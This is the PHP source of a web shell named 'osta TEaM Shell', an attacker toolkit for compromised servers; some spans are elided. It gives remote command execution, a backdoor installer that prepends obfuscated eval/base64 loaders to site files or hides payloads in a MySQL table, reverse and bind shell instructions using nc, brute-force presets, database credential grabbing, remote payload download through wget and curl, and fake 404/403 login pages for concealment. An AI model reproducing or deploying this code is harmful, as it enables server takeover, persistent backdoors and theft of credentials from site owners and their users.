...
define("__osta_MD5NAME__", md5($_SERVER["SCRIPT_FILENAME"]));
define("__osta_VERSION__", "3.0.2");
define("__LAST_CWD__", "last_cwd_".__osta_MD5NAME__);
define("__PATH_HISTORY__", "path_history_".__osta_MD5NAME__);
define("__osta_POST_ENCRYPTION__", (isset($GLOBALS["DB_NAME"]["post_encryption"])&&$GLOBALS["DB_NAME"]["post_encryption"]==true?true:false));
$GLOBALS['__osta_COLOR__'] = array(
		"shell_border" => array(
			"key_color" => "#0E304A",
		...
		"osta+" => array(
			"key_color" => "#27E8AE",
			"multi_selector" => array(
				".osta_plus" => "color: {color};font-weight: unset;",
			)
		),
...
$config = array('ostaUser' => $GLOBALS['DB_NAME']['user'],'ostaPass' => $GLOBALS['DB_NAME']['pass'],'ostaProtectShell' => $GLOBALS['DB_NAME']['safemode'],'ostaLoginPage' => $GLOBALS['DB_NAME']['login_page']);
@session_start();
if($config['ostaProtectShell']){
...
if($config['ostaLoginPage'] == 'gui'){
if(@$_SESSION["ostaUser"] != $config['ostaUser'] && @$_SESSION["ostaPass"] != @md5($config['ostaPass'])){
if(@$_POST["usrname"]==$config['ostaUser'] && @md5($_POST["password"])==$config['ostaPass']){
@$_SESSION["ostaUser"] = $config['ostaUser'];
@$_SESSION["ostaPass"] = @md5($config['ostaPass']);
...
<title>~ osta TEaM Shell-v'.__osta_VERSION__.' ~</title><center>
<center><img style="border-radius:100px;" width="500" height="250" alt="" src="http://up.iranblog.com/uploads/IMG-20200411-110547-644.jpg" /></center>
<div id=loginbox><p><font face="verdana,arial" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="green"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="green" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="verdana,arial"><b>~ osta TEaM Shell-v'.__osta_VERSION__.' ~</b></font></th></tr>
...
}elseif($config['ostaLoginPage']=='500'){
if(@$_SESSION["ostaPass"] != @md5($config['ostaPass'])){
if(@md5($_POST["password"])==$config['ostaPass']){
@$_SESSION["ostaUser"] = $config['ostaUser'];
@$_SESSION["ostaPass"] = @md5($config['ostaPass']);
header('location: '.$_SERVER["PHP_SELF"]);
}
...
}elseif($config['ostaLoginPage']=='403'){
if(@$_SESSION["ostaPass"] != @md5($config['ostaPass'])){
if(@md5($_POST["password"])==$config['ostaPass']){
@$_SESSION["ostaUser"] = $config['ostaUser'];
@$_SESSION["ostaPass"] = @md5($config['ostaPass']);
...
}elseif($config['ostaLoginPage']=='404'){
if(@$_SESSION["ostaPass"] != @md5($config['ostaPass'])){
if(@md5($_POST["password"])==$config['ostaPass']){
@$_SESSION["ostaUser"] = $config['ostaUser'];
@$_SESSION["ostaPass"] = @md5($config['ostaPass']);
...
function _ostaSecretKey(){
	if(!isset($_SESSION["ostaSecretKey"])){
		$_SESSION["ostaSecretKey"] = uniqid(mt_rand(), true);
	}
	return $_SESSION["ostaSecretKey"];
}
function osta_getColor($target){
	if(isset($GLOBALS["DB_NAME"]["color"][$target])&&$GLOBALS["DB_NAME"]["color"][$target]!=""){
		return $GLOBALS["DB_NAME"]["color"][$target];
	}else{
		$target = $GLOBALS["__osta_COLOR__"][$target];
		if(is_array($target)){
...
function ostaCssLoadColors(){
	$css = "";
	foreach($GLOBALS['__osta_COLOR__'] as $key => $value){
		if(!is_array($value)){
			$value = osta_getColor($key);
			$css .= ".{$key}{color: {$value};}";
		}else{
			if(isset($value["multi_selector"])){
				foreach($value["multi_selector"] as $k => $v){
					$color = osta_getColor($key);
...
echo '<script>';
foreach($ostax as $osta){
if(in_array($osta,$find))
continue;
echo 'osta'.$osta."_=";
}
echo '""</script>';
}}
function _osta_cgicmd($cmd,$lang="perl"){
	if(isset($_SESSION["ostacgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_SESSION["ostacgiapi"])){
			if(!@file_exists("ostacgiapi/".$_SESSION["ostacgiapi"].".osta")){
				$recreate = true;
				$lang = $_SESSION["ostacgiapi"];
			}
		}
		if(!isset($_SESSION["ostacgiapi"])||$recreate){
			...
			ostaWriteTocgiapi($lang.".osta",$source);
			ostacgihtaccess('cgi', "ostacgiapi/");
		}else{
			$lang = $_SESSION["ostacgiapi"];
		}
		$cmd = "check=W3NvbGV2aXNpYmxlfmFwaV0=&cmd=".__ZW5jb2Rlcg("cd ".$GLOBALS['cwd'].";".$cmd);
		if($is_curl){
			$address = ($_SERVER['SERVER_PORT'] == 443 ? "https://" : "http://").$_SERVER["SERVER_NAME"].dirname($_SERVER["REQUEST_URI"])."/ostacgiapi/".$lang.".osta";
			$post = new ostaCURL();
			$data = $post->Send($address, "post", $cmd);
		}elseif($is_socket){
			$server = $_SERVER["SERVER_NAME"];
			$uri = dirname($_SERVER["REQUEST_URI"])."/ostacgiapi/".$lang.".osta";
			$data = _osta_fsockopen($server,$uri,$cmd);
		}
		$out = "";
		if(strstr($data, "[solevisible~api]")){
			$_SESSION["ostacgiapi"] = $lang;
			if(@preg_match("/<pre>(.*?)<\/pre>/s", $data, $res)){
				$out = $res[1];
			}
		}elseif($lang=="perl"){
			return _osta_cgicmd($cmd_pure,"py");
		}elseif($lang=="py"){
			return _osta_cgicmd($cmd_pure,"bash");
		}else{
			$_SESSION["ostacgiapi_mode"] = "off";
		}
		return trim($out);
	}else{
		return "";
...
function ostaEx($in,$re=false,$cgi=true,$all=false){
	$data = _osta_php_cmd($in,$re);
	if(empty($data)&&$cgi||$all){
		if($GLOBALS['sys']=='unix'){
			if(strlen(_osta_php_cmd("whoami"))==0||$all){
				$cmd = _osta_cgicmd($in);
				if(!empty($cmd)){
					return $cmd;
				}
...
function _osta_php_cmd($in,$re=false){
$out='';
try{
if($re)$in=$in." 2>&1";
...
$ostaWs = new COM('WScript.shell');
$exec = $ostaWs->exec('cmd.exe /c '.$_POST['osta1']);
$stdout = $exec->StdOut();
$out=$stdout->ReadAll();
}
}catch(Exception $e){}
...
function _osta_fsockopen($server,$uri,$post){
...
$_POST[$key][$i] = decrypt_post($f, _ostaSecretKey());
$i++;
}
}else{
$value = trim(str_replace(' ', '+',$value));
$_POST[$key] = decrypt_post($value, _ostaSecretKey());
}
}
...
function ostaGetPathHistory(){echo (isset($_SESSION[__PATH_HISTORY__])&&!empty($_SESSION[__PATH_HISTORY__])?$_SESSION[__PATH_HISTORY__]: $GLOBALS['home_cwd']);}
function ostahead(){
if(!function_exists('sys_get_temp_dir')){function sys_get_temp_dir() {foreach (array('TMP', 'TEMP', 'TMPDIR') as $env_var) {if ($temp = getenv($env_var)) {return $temp;}}$temp = tempnam($GLOBALS['__file_path'], '');if (_osta_file_exists($temp,false)) {unlink($temp);return dirname($temp);}return null;}}
$GLOBALS['__osta_SHELL_CODE'] = '';
$osta_uploader = '$x = base64_decode("'.$GLOBALS['__osta_SHELL_CODE'].'");$solevisible = fopen("solevisible.php","w");fwrite($solevisible,$x);';
define("osta_UPLOADER", "eval(base64_decode('".__ZW5jb2Rlcg($osta_uploader)."'))");
define("osta_TEMPDIR", (function_exists("sys_get_temp_dir") ? (@is_writable(str_replace('\\','/',sys_get_temp_dir()))?sys_get_temp_dir():(@is_writable('.')?'.':false)) : false));
if(!isset($_POST['ajax'])){
function osta_GetDisable_Function(){
$disfun = @ini_get('disable_functions');
...
<link href="'.__showicon('ostamini').'" rel="icon" type="image/x-icon"/>
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ osta TEaM Shell - v'.__osta_VERSION__.' ::..</title>
...
var osta1_ = '" . ((strpos(@$_POST['osta1'],"\n")!==false)?'':htmlspecialchars($_POST['osta1'],ENT_QUOTES)) ."';
var osta2_ = '" . ((strpos(@$_POST['osta2'],"\n")!==false)?'':htmlspecialchars($_POST['osta2'],ENT_QUOTES)) ."';
var osta3_ = '" . ((strpos(@$_POST['osta3'],"\n")!==false)?'':htmlspecialchars($_POST['osta3'],ENT_QUOTES)) ."';
var osta4_ = '" . ((strpos(@$_POST['osta4'],"\n")!==false)?'':htmlspecialchars($_POST['osta4'],ENT_QUOTES)) ."';
var osta5_ = '" . ((strpos(@$_POST['osta5'],"\n")!==false)?'':htmlspecialchars($_POST['osta5'],ENT_QUOTES)) ."';
var osta6_ = '" . ((strpos(@$_POST['osta6'],"\n")!==false)?'':htmlspecialchars($_POST['osta6'],ENT_QUOTES)) ."';
var osta7_ = '" . ((strpos(@$_POST['osta7'],"\n")!==false)?'':htmlspecialchars($_POST['osta7'],ENT_QUOTES)) ."';
var osta8_ = '" . ((strpos(@$_POST['osta8'],"\n")!==false)?'':htmlspecialchars($_POST['osta8'],ENT_QUOTES)) ."';
var osta9_ = '" . ((strpos(@$_POST['osta9'],"\n")!==false)?'':htmlspecialchars($_POST['osta9'],ENT_QUOTES)) ."';
var osta10_ = '" . ((strpos(@$_POST['osta10'],"\n")!==false)?'':htmlspecialchars($_POST['osta10'],ENT_QUOTES)) ."';
var d = document;
var mysql_cache = {};
var editor_files = {};
...
var post_encryption_mode = ".(__osta_POST_ENCRYPTION__?'true':'false').";
function set(a,c,osta1,osta2,osta3,osta4,osta5,osta6,osta7,osta8,osta9,osta10,charset) {
if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;";
for($j=1;$j<=10;$j++){
echo 'if(osta'.$j.'!=null)d.mf.osta'.$j.'.value=osta'.$j.';else d.mf.osta'.$j.'.value=osta'.$j.'_;';
}
echo "
if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
}";
echo 'function fc(a){ostaloader("block");var b="a="+ostab64("FilesMan")+"&c="+ostab64(a.c.value)+"&osta1="+ostab64(a.osta1.value)+"&ajax="+ostab64("true")+"&",c="";for(i=0;i<d.files.elements.length;i++)"checkbox"==d.files.elements[i].type&&d.files.elements[i].checked&&(c+="f[]="+ostab64(d.files.elements[i].value)+"&");_Ajax(d.URL,b+c,function(a){ostaloader("none")},!0)}function initDir(a){var b="",c="";islinux&&(b="<a class=\"header_pwd\" onclick=\"g(\'FilesMan\',\'/\');\" href=\'javascript:void(0);\'>/</a>",c="/");var e=a.split("/"),f="",g="";"-1"!=e.indexOf("..")&&(e.splice(e.indexOf("..")-1,1),e.splice(e.indexOf(".."),1));for(i in e)""!=e[i]&&(f+="<a onclick=\"g(\'FilesMan\',\'"+g+e[i]+"/\');\" href=\'javascript:void(0);\' class=\"header_pwd\">"+e[i]+"/</a>",g+=e[i]+"/");$("header_cwd").innerHTML=b+f+" ";var e=c+e.join("/");e=e.replace("//","/"),d.footer_form.c.value=e,$("footer_cwd").value=e,c_=e}function evalJS(html){var newElement=document.createElement("div");newElement.innerHTML=html;for(var scripts=newElement.getElementsByTagName("script"),i=0;i<scripts.length;++i){var script=scripts[i];eval(script.innerHTML)}}function _Ajax(a,b,c,e){var f=!1;return window.XMLHttpRequest?f=new XMLHttpRequest:window.ActiveXObject&&(f=new ActiveXObject("Microsoft.XMLHTTP")),f?(f.onreadystatechange=function(){4==f.readyState&&200==f.status&&("function"!=typeof c?d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText:e?(d.getElementsByClassName("ajaxarea")[0].innerHTML=f.responseText,c(f.responseText)):c(f.responseText))},f.open("POST",a,!0),f.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),f.send(b),void 0):void alert("Error !")}function handleup(a,b){var c="__fnameup";0!=b&&(c="__fnameup"+b),a.files[0].name&&($(c).innerHTML=a.files[0].name)}function u(a){ostaloader("block");a.submit.disabled=true;var av = a.a.value,cv = a.c.value,alv = a.osta1.value,cha = a.charset.value;var b=!1;if(a.a.value=ostab64(a.a.value),a.c.value=ostab64(a.c.value),a.osta1.value=ostab64(a.osta1.value),a.charset.value=ostab64(a.charset.value),window.XMLHttpRequest?b=new XMLHttpRequest:window.ActiveXObject&&(b=new ActiveXObject("Microsoft.XMLHTTP")),b){var c=$("up_bar");b.upload&&(c.style.display="block",b.upload.onprogress=function(a){var b=a.position||a.loaded,d=a.totalSize||a.total,e=Math.floor(b/d*1e3)/10+"%";c.style.width=e}),b.onload=function(e){for(200===b.status?(_Ajax(d.URL,"a="+ostab64("FilesMan")+"&c="+a.c.value+"&ajax="+ostab64("true")),c.style.display="none",a.a.value=av,a.c.value=cv,a.osta1.value=alv,a.charset.value=cha):alert("An error occurred!"),$("footerup").value="",$("__fnameup").innerHTML="";upcount;){var f=$("pfooterup_"+upcount);f&&f.parentNode.removeChild(f),upcount--}0==upcount&&upcount++,ostaloader("none"),a.submit.disabled=false},b.onerror=function(a){};var e=new FormData(a);b.open("POST",d.URL),b.send(e)}}function g(a,c,osta1,osta2,osta3,osta4,osta5,osta6,osta7,osta8,osta9,osta10,charset){set(a,c,osta1,osta2,osta3,osta4,osta5,osta6,osta7,osta8,osta9,osta10,charset),"GetConfig"!=a&&"download"!=osta2&&(d.getElementsByClassName("ajaxarea")[0].innerHTML=\'<center><br /><img id="ostaloader" src="'.__showicon('loader').'"></img><br /><br /></center>\'),islinux&&"/"!=d.mf.c.value.substr(0,1)&&(d.mf.c.value="/"+d.mf.c.value);for(var data="a="+ostab64(a)+"&c="+ostab64(d.mf.c.value)+"&",i=1;i<=10;i++)data+="osta"+i+"="+ostab64(eval("d.mf.osta"+i+".value"))+"&";if(data+="&ajax="+ostab64("true"),"FilesTools"==a&&"download"==osta2){var dl=$("dlForm");return dl.a.value=ostab64("dlfile"),dl.c.value=ostab64(d.mf.c.value),dl.file.value=ostab64(osta1),void dl.submit()}"GetConfig"!=a?(_Ajax(d.URL,data),c!=c_&&c&&initDir(c)):(ostaloader("block"),_Ajax(d.URL,data,function(a){try{a=JSON.parse(a),a.host&&a.user&&a.dbname&&($("db_host")&&($("db_host").value=a.host),$("db_user")&&($("db_user").value=a.user),$("db_name")&&($("db_name").value=a.dbname),$("db_pw")&&($("db_pw").value=a.password),$("db_prefix")&&a.prefix&&($("db_prefix").value=a.prefix),$("cc_encryption_hash")&&a.cc_encryption_hash&&($("cc_encryption_hash").value=a.cc_encryption_hash))}catch(a){}ostaloader("none")}))}function ostaloader(a){$("a_loader").style.display=a}function fsu(a){ostaloader("block");for(var b={},c=0;c<a.elements.length;c++)"submit"!=a.elements[c].type&&(b[a.elements[c].name]=a.elements[c].value);for(c in mysql_cache)mysql_cache[c]=ostab64(mysql_cache[c]);_Ajax(d.URL,"a="+ostab64("Sql")+"&osta1="+ostab64("update")+"&osta2="+ostab64(JSON.stringify(b))+"&c="+ostab64(c_)+"&charset="+mysql_cache.charset+"&type="+mysql_cache.type+"&sql_host="+mysql_cache.host+"&sql_login="+mysql_cache.user+"&sql_pass="+mysql_cache.pass+"&sql_base="+mysql_cache.db+"&sql_count="+mysql_cache.count+"&ajax="+ostab64("true"),function(a){evalJS(a),ostaloader("none")},!0)}function fs(f,e){ostaloader("block");var osta1="query",osta2=f.query?ostab64(f.query.value):"",host=f.sql_host?f.sql_host.value:mysql_cache.host,user=f.sql_login?f.sql_login.value:mysql_cache.user,pass=f.sql_pass?f.sql_pass.value:mysql_cache.pass,db=f.sql_base?f.sql_base.value:mysql_cache.db,type=f.type?f.type.value:mysql_cache.type,charset=f.charset?f.charset.value:mysql_cache.charset,count="";switch(count=f.sql_count?f.sql_count.checked?"true":"":mysql_cache.count,f){case"0":osta1="select",osta2=ostab64(e);break;case"1":e=eval(e),osta1="select",osta2=ostab64(e[0])+"&osta3="+ostab64(e[1]);break;case"2":e=eval(e),osta1="edit",osta2=ostab64(db)+"&osta3="+ostab64(e.join(":"));break;case"3":osta1="loadfile",osta2=ostab64(e);break;case"4":case"5":osta1=(f=="4"?"dumpfile":"droptbl");var obj={},id=$("dumpfile");for(obj.file=id?id.value:"dump.sql",obj.tbl=[],i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked&&obj.tbl.push(d.sf.elements["tbl[]"][i].value);osta2=ostab64(JSON.stringify(obj))}_Ajax(d.URL,"a="+ostab64("Sql")+"&osta1="+ostab64(osta1)+"&osta2="+osta2+"&c="+ostab64(c_)+"&charset="+ostab64(charset)+"&type="+ostab64(type)+"&sql_host="+ostab64(host)+"&sql_login="+ostab64(user)+"&sql_pass="+ostab64(pass)+"&sql_base="+ostab64(db)+"&sql_count="+ostab64(count)+"&ajax="+ostab64("true"),function(a){evalJS(a),ostaloader("none")},!0)}function ctlbc(a){var b=$("bcStatus"),c=$("bcipAction");"bind"==a.value?(c.style.display="none",b.innerHTML="<small>Press ` <font color=\'red\'>>></font> ` button and run ` <font color=\'red\'>nc server_ip port</font> ` on your computer</small>"):(c.style.display="inline-block",b.innerHTML="<small>Run ` <font color=\'red\'>nc -l -v -p port</font> ` on your computer and press ` <font color=\'red\'>>></font> ` button</small>")}function is(){for(i=0;i<d.sf.elements["tbl[]"].length;++i)d.sf.elements["tbl[]"][i].checked=!d.sf.elements["tbl[]"][i].checked}function $(a){return d.getElementById(a)}function addnewup(){var a="footerup_"+upcount,b="pfooterup_"+upcount,c=1!=upcount?"pfooterup_"+(upcount-1):"pfooterup",e=d.createElement("p");e.innerHTML=\'<label class="inputfile" for="\'+a+\'"><span id="__fnameup\'+upcount+\'"></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id="\'+a+\'" type="file" name="f[]" onChange="handleup(this,\'+upcount+\');">\',e.id=b,e.appendAfter($(c)),upcount++}function osta_searcher_tool(a){switch(a){case"all":case"dirs":_ostaSet(!0,"Disabled");break;case"files":_ostaSet(!1,"php")}}function _ostaSet(a,b){d.srch.ext.disabled=a,d.srch.ext.value=b}function dis_input(a){switch(a){case"phpmyadmin":bruteSet(!0,"Disabled","http://");break;case"direct":bruteSet(!1,"2222","http://");break;case"cp":bruteSet(!1,"2082","http://");break;case"ftp":bruteSet(!0,"Disabled","ftp://");break;case"mysql":bruteSet(!1,"3306","http://");break;case"ftpc":bruteSet(!1,"21","http://")}}function bruteSet(a,b,d){"21"!=b?c="localhost":c="ftp.example.com",$("port").disabled=a,$("port").value=b,$("target").value=c,$("protocol").value=d}Element.prototype.appendAfter=function(a){a.parentNode.insertBefore(this,a.nextSibling)};function inBackdoor(t){if(t.value=="my"){$("backdoor_textarea").style.display="block";}else{$("backdoor_textarea").style.display="none";}}
...
function editor(file, mode, arg, pwd, file_id, type){
	...
	if(Object.keys(editor_files).length == 0){
		var cookie_file = getCookie("osta_history_files");
		try{
	...
	if(typeof file_id != "undefined" && file_id != null && file_id.length != 0){
		...
		fid = ostab64(rand_fid);
		pure_fid = rand_fid;
	}
	ostaloader("block");
	_Ajax(d.URL, "a="+ostab64("FilesTools")+"&c="+ostab64(cwd)+"&osta1="+ostab64(file)+"&osta2="+ostab64(mode)+"&osta3="+param+"&osta4="+fid+"&osta5=&osta6=&osta7=&osta8=&osta9=&osta10=&&ajax="+ostab64("true"), function(e){
...
function loadType(file,type,id){
	if(type == "none"){
		_Ajax(d.URL, "a="+ostab64("checkfiletype")+"&path="+ostab64(editor_files[id].pwd)+"&arg="+ostab64(editor_files[id].file), function(e){
...
function updateDirsEditor(fid, fname){
	...
	if(current_path.search(oldpath) != -1){
		...
		_Ajax(d.URL,"a="+ostab64("updatepath")+"&path="+ostab64(d.mf.c.value),function(e){console.log(e)});
	}
	for(var i in editor_files){
...
function updateCookieEditor(){
	setCookie("osta_history_files", JSON.stringify(editor_files), 2012);
}
...
function encrypt(str, pwd) {
	...
	str = ostab64(str, true);
	pwd = ostab64(pwd, true);
	var enc_chr = "";
	var enc_str = "";
	var i = 0;
	while (i < str.length) {
	...
	return ostab64(enc_str, true);
}
function reloadSetting(e){
ostaloader("block");
_Ajax(d.URL,"a="+ostab64("settings")+"&osta1="+ostab64(e.protect.value)+"&osta2="+ostab64(e.lgpage.value)+"&osta3="+ostab64(e.username.value)+"&osta4="+ostab64(e.password.value)+"&osta5="+ostab64(">>")+"&osta6="+ostab64(e.icon.value)+"&osta7="+ostab64(e.post_encrypt.value)+"&osta8="+ostab64("main")+"&c="+ostab64(c_)+"&ajax="+ostab64("true"),function(a){evalJS(a),ostaloader("none")},true);
...
function reloadColors(config){
	...
	_Ajax(d.URL,"a="+ostab64("settings")+"&osta1="+ostab64(JSON.stringify(obj))+"&osta2="+ostab64(">>")+"&osta3="+ostab64(checdk)+"&osta8="+ostab64("color")+"&c="+ostab64(c_)+"&ajax="+ostab64("true"),function(e){ostaloader("none");evalJS(e);},true);
}
function ostab64(a, normal){
	if(typeof normal != "undefined" || post_encryption_mode == false){
		return window.btoa(unescape(encodeURIComponent(a)));
	}
	return encrypt(a, "'._ostaSecretKey().'");
}
...
function path_history(pos){
	_Ajax(d.URL,"a="+ostab64("GetPathHistory")+"&ajax="+ostab64("true"),function(e){g("FilesMan", e);},true);
}
function runcgi(lang){
	...
	_Ajax(d.URL,"a="+ostab64("cgishell")+"&osta1="+ostab64(lang)+"&ajax="+ostab64("true"),function(e){
		d.body.style.overflow = "hidden";
...
$cmd_uname = ostaEx("uname -a",false,false);
...
for($s=1;$s<=10;$s++){
echo '<input type="hidden" name="osta'.$s.'">';
}
echo '<input type="hidden" name="charset">
</form>
<div id=\'hidden_sh\'><a class="alert_green" target="_blank" href="?solevisible">Hidden Shell<br><small>Version: <span class="hidden_shell_version">'.__osta_VERSION__.'</span></small></a></div>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="" src="http://up.iranblog.com/uploads/IMG-20200411-110547-644.jpg" /></td>
</tr>
<tr>
...
if($GLOBALS['sys']=='unix'){
$d0mains = _osta_file("/etc/named.conf",false);
...
<td><span class="header_vars">Total:</span><b>'.ostaSize($totalSpace).' </b><span class="header_vars">Free:</span><b>' . ostaSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</b></td>
</tr>';
if($GLOBALS['sys']=='unix'){
...
if(!@ini_get('safe_mode')){
if(strlen(ostaEx("id",false,false))>0){
echo '<tr><td height="18" colspan="2"><span class="header_vars">Useful : </span>';
$userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bziosta2','nc','locate','suidperl');
$x=0;
foreach($userful as $item)if(ostaWhich($item)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item.'</span>';}
...
$x=0;
foreach($downloaders as $item2)if(ostaWhich($item2)){$x++;echo '<span class="header_values" style="margin-left: 4px;">'.$item2.'</span>';}
...
'cmshijacker'=>'CMS Hijacker','remotedl'=>'Remote Upload','inbackdoor'=>'Install BackDoor','whois'=>'Whois','settings'=>'osta Settings','plus'=>'<span class="osta_plus">osta +</font>','selfrm'=>'Remove Shell'
);
foreach($li as $key=>$value){
echo('<li><a href="javascript:void(0);" class="menu_options" onclick="g(\''.$key.'\',null,\'\',\'\',\'\');">'.$value.'</a></li>'."\n");
}
if(!empty($_SESSION['ostaUser']) && !empty($_SESSION['ostaPass']))
...
function ostalogout(){
unset($_SESSION['ostaUser'],$_SESSION['ostaPass']);
...
$textarea = "<div style='display:none;' id='backdoor_textarea'><div class='txtfont'>Your Shell:</div><p><textarea name='shell' rows='19' cols='103'><?php\n\techo('osta Team is Here...!');\n?></textarea></p></div>";
$select = "<div class='txtfont'>Use:</div> <select name='method' style='width:155px;' onChange='inBackdoor(this);'><option value='osta'>osta Team Uploader</option><option value='my'>My Private Shell</option></select>";
$cwd = 'Example: /home/osta/public_html/index.php';
if($_POST['osta1']=='file'){
echo("<center><p><div class='txtfont_header'>| In File |</div></p><p><form onsubmit=\"g('inbackdoor',null,'file',this.method.value,this.file.value,this.shell.value,this.key.value);return false;\">{$select} <div class='txtfont'>Backdoor Loader:</div> <input type='text' name='file' size='50' placeholder='{$cwd}'> <div class='txtfont'>Key: </div> <input type='text' name='key' size='10' value='osta'> <input type='submit' value=' '>{$textarea}</form></p></center>");
if($_POST['osta2']!=''&&$_POST['osta3']!=''&&$_POST['osta4']!=''){
$method = $_POST['osta2'];
$file = $_POST['osta3'];
$shell = $_POST['osta4'];
$key = str_replace(array('"','\''),'',trim($_POST['osta5']));
if($key=='')$key='osta';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__osta_SHELL_CODE'];}
$code = '<?php if(isset($_GET["osta"])&&$_GET["osta"]=="'.$key.'"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x("'.$shell.'");exit;}?>';
if(@is_file($file)&&@is_writable($file)){@file_put_contents($file,$code."\n".@file_get_contents($file));__alert($success."<br>Run With: ".basename($file)."?osta=".$key.'</font>');}else{__alert($error);}}}
if($_POST['osta1']=='db'){
...
'td6' =>
array('color' => 'FFFFFF', 'tdName' => 'Key: ', 'inputName' => 'key', 'inputValue' => 'osta', 'inputSize' => '50')
);
create_table($table);
echo("<p>{$select}</p>");
echo($textarea);
echo("<p><input type='submit' value=' '></p></form></p></center>");
if($_POST['osta2']!=''&&$_POST['osta3']!=''&&$_POST['osta5']!=''&&$_POST['osta6']!=''){
$dbhost = $_POST['osta2'];
$dbuser = $_POST['osta3'];
$dbpw = $_POST['osta4'];
$dbname = $_POST['osta5'];
...
$method = $_POST['osta7'];
$shell = $_POST['osta8'];
$key = str_replace(array('"','\''),'',trim($_POST['osta9']));
if($key=='')$key='osta';
if($method=='my'){$shell=__ZW5jb2Rlcg($shell);}else{$shell=$GLOBALS['__osta_SHELL_CODE'];}
if($conn = mysqli_connect($dbhost,$dbuser,$dbpw,$dbname)){
$code = '<?php if(isset($_GET["osta"])&&$_GET["osta"]=="'.$key.'"){$conn=mysqli_connect("'.str_replace('"','\"',$dbhost).'","'.str_replace('"','\"',$dbuser).'","'.str_replace('"','\"',$dbpw).'","'.str_replace('"','\"',$dbname).'");$q=mysqli_query($conn,"SELECT `code` FROM osta_bc LIMIT 0,1");$r=mysqli_fetch_assoc($q);$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."(\'?>\'.base"."64"."_dec"."ode(\$c));");$x($r["code"]);exit;}?>';
if(@is_file($file)&&@is_writable($file)){
@mysqli_query($conn,'DROP TABLE `osta_bc`');
@mysqli_query($conn,'CREATE TABLE `osta_bc` (code LONGTEXT)');
@mysqli_query($conn,'INSERT INTO `osta_bc` VALUES("'.$shell.'")');
@file_put_contents($file,$code."\n".@file_get_contents($file));
__alert($success."<br>Run With: ".basename($file)."?osta=".$key.'</font>');}else{__alert($error);}}}}
echo('</div>');
ostafooter();
}
function ostawhois(){
...
if($_POST['osta2']=='>>'&&!empty($_POST['osta1'])){
$site = str_replace(array('http://','https://','www.','ftp://'),'',$_POST['osta1']);
$target = 'http://api.whoapi.com/?apikey=093b6cb9e6ea724e101928647df3e009&r=whois&domain='.$site;
$data = @file_get_contents($target);
if($data==''){$get = new ostaCURL();$get->ssl = true;$data = $get->Send($target);}
$target = @json_decode($data,true);
echo __pre();
if(is_array($target)){echo($target["whois_raw"]);}else{echo ostaEx("whois ".$site);}}
echo("</div>");
}
function ostaremotedl(){
ostahead();
...
if(isset($_POST['osta1'],$_POST['osta2'],$_POST['osta3'])&&!empty($_POST['osta1'])&&$_POST['osta3']=='>>'){
echo __pre();
$url = $_POST['osta1'];
$path = $_POST['osta2'];
echo('<center>');
...
$buff = ostaEx("wget ".$url." -O ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("curl ".$url." -o ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = ostaEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
...
if(empty($content)||!$content){
	$content = ostaEx("cat '".addslashes($file)."'");
}
return $content;
}
function ostaSettings(){
ostahead();
ostaNum(6,7,8,9,10);
...
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['osta7'])&&$_POST['osta7']==$key?"selected":(__osta_POST_ENCRYPTION__&&empty($_POST['osta7'])?'selected':'')).'>'.$val.'</option>';
...
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#FFFFFF">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">UserName:</div></td><td><input type="text" style="width:95%;" name="username" value="'.(empty($_POST['osta3'])?$GLOBALS['DB_NAME']['user']:$_POST['osta3']).'" placeholder="solevisible"></td></tr><tr><td><div class="tbltxt" style="color:#FFFFFF">Password:</div></td><td><input type="text" style="width:95%;" name="password" placeholder="*****"></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['osta5']=='>>'){
echo __pre();
if(!empty($_POST['osta3'])){
$protect = $_POST['osta1'];
$lgpage = $_POST['osta2'];
$username = $_POST['osta3'];
